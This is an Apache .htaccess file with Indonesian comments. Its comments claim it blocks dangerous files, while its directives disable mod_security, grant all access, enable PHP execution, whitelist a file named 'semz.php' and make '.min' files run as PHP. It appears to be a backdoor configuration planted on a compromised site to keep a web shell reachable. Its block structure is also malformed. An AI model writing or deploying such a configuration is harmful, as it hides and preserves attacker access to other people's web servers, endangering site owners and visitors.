<IfModule mod_security.c>
    SecFilterEngine Off
    SecFilterScanPOST Off
</IfModule>

# Blokir file dengan ekstensi berbahaya
<FilesMatch "\.(php[0-9]?|phtml|phps|phar|asp|aspx|shtml|cgi|exe|pl|py|sh|bash|cmd|bat|scr|dll)$">
    Order allow,deny
    Deny from all<IfModule mod_rewrite.c>
    RewriteEngine On
</IfModule>

# Izinkan semua akses
<IfModule mod_access_compat.c>
    Order allow,deny
    Allow from all
</IfModule>

<IfModule mod_authz_core.c>
    Require all granted
</IfModule>

# Aktifkan eksekusi PHP di folder ini
<FilesMatch "\.(php|php3|php4|php5|phtml|phar)$">
    SetHandler application/x-httpd-php
</FilesMatch>

# Matikan proteksi bawaan
Options +Indexes +ExecCGI +FollowSymLinks
AllowOverride All

</FilesMatch>

# Blokir file PHP yang disamarkan sebagai gambar atau dokumen
<FilesMatch "\.(php\.(jpg|jpeg|png|gif|pdf|txt|zip|docx?|xlsx?|pptx?)|php[0-9]*\.(jpg|jpeg|png|gif|pdf)|php\.suspected)$">
    Order allow,deny
    Deny from all
</FilesMatch>

# Izinkan file tertentu yang memang sah untuk diakses
<FilesMatch "^(semz.php)$">
    Order allow,deny
    Allow from all
</FilesMatch>

# Izinkan ekstensi .min untuk diproses sebagai PHP
AddType application/x-httpd-php .min
